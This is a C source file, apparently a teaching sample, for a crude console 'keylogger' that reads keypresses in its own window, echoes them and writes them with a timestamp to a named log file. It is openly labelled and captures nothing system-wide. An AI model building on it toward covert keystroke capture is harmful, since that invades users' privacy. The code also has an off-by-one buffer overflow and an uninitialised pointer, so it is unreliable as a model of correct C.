/** ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 *    filename :  keylogger.c
 *    purpose  :  sample keylogging utility showing use of system calls
 *    author   :  Dr. Johnson
 *    date     :  2020-03-28
 *    note     :  this demonstration shows how a keylogger can intercept key strokes in
 *                a VERY crude way, buffer them up, and write the output to a file after
 *                every 255 key presses.  A timestamp is also provided for every write
 *                to the log file.  Log file name is a command line argument.
 *
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ */

#include <sys/types.h>
#include <conio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <windows.h>

#define BUFFER_SIZE      255              // use a buffer size of 255 bytes
#define OUTPUT_MODE     0700              // protection patter for chmod
#define TIME_STR_LEN      24              // length of time code string

// handy-dandy error message handler
void printUsage() {
   printf( "\n\n   USAGE: keylogger <log_file>\n" );
   printf( "         where:\n" );
   printf( "      <log_file> is the path/filename of the keylog text file\n" );
}

// time handler function to create a nice string for the current time
char * updateTime( char * timeString ) {
   time_t rawTime;
   struct tm *timeInfo;
   timeString = (char *)malloc( TIME_STR_LEN * sizeof(char) );

   time( &rawTime );
   timeInfo = localtime( &rawTime );
   strftime( timeString, TIME_STR_LEN, "\n%Y-%m-%d_%H-%M-%S: ", timeInfo );
   return timeString;
}

// program main entry point
int main( int argc, char *argv[] ) {

  // let the world know that we've started; originally here just to check
  //  that compilation completed successfully with multiple commands on the
  //  compile line, like "gcc blah.c -o blah && blah"
   printf( "\n   compile test: hello world!\n\n" );

   char buffer[BUFFER_SIZE];  // buffer to hold file contents 255 bytes at a time
   char * currentTime;        // buffer to hold teme updates

   unsigned char c;           // character to be read and written

   int outputFD;              // output file descriptor
   int readCount;             // count of bytes read from source
   int writeCount;            // count of bytes written to target

  // check to make sure there is enough information from the command line
   if( 2 != argc ) {
      printUsage();
      exit( -1 );
   }

   printf( "   ...all good!\n\n" );

  // get the starting time for when the keylogger has fired up
   currentTime = updateTime( currentTime );
   printf( "\n\n   The current time is: %s\n", currentTime );

  // it's all good, so the target is in args[1]
  //  be sure to check the open return values for errors!
   outputFD = creat( argv[1], OUTPUT_MODE );
   if( outputFD < 0 ) {
      printf( "\n   Problem opening file '%s'...\n\n", argv[1] );
      printUsage();
      exit( -3 );
   }

  // create the handle to the window for example purposes
   HANDLE handleToStdIn = NULL;
   handleToStdIn = GetStdHandle( STD_INPUT_HANDLE );

  // write the current session start time to the target
   readCount = strlen( currentTime );
   writeCount = write( outputFD, currentTime, TIME_STR_LEN );
   if( writeCount <= 0 ) {
      printf( "\n   Problem writing target '%s'\n\n", argv[1] );
      exit( -4 );
   }

  // loop forever waiting for a keypress; when one is detected,
  //  log it to the buffer.  when the buffer is full, write it to
  //  the target.
   int i = 0;
   buffer[0] = '\0';
   while( 1 ) {
      if( kbhit() ) {
         printf( "key press detected: " );
         buffer[i] = getch();
         buffer[i+1] = '\0';
         printf( "keypress %d value is %c\n", i, buffer[i] );
         i++;
      }
      if ( i == BUFFER_SIZE ) {
         writeCount = write( outputFD, buffer, BUFFER_SIZE );
         if( writeCount <= 0 ) {
            printf( "\n   Problem writing target '%s'\n\n", argv[1] );
            exit( -4 );
         }
         buffer[0] = '\0';
         i = 0;
      }
   }

  // close the file and exit the program
   close( outputFD );
   exit( 0 );

}
